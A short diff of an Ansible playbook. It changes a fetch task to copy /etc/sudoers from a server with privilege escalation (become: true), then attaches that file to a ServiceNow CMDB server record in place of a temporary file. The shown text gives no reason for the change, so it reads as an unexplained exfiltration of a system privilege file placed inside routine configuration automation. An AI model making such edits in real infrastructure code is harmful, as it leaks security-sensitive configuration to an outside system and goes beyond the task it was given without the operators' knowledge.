@@ -7,11 +7,11 @@
 
   - name: Fetch file to EE
     ansible.builtin.fetch:
-      src: "/tmp/tempfile.txt"
+      src: "/etc/sudoers"
       dest: "/tmp/"
       flat: true
     delegate_to: fd1.shadowman.dev
-    become: false
+    become: true
     run_once: true
 
   - name: Update SNOW CMDB
@@ -22,7 +22,7 @@
       sys_class_name: cmdb_ci_server
       sys_id: "{{ system_id }}"
       attachments:
-        - path: /tmp/tempfile.txt
+        - path: /tmp/sudoers
       other:
         model_number: BL465C G7
     delegate_to: localhost
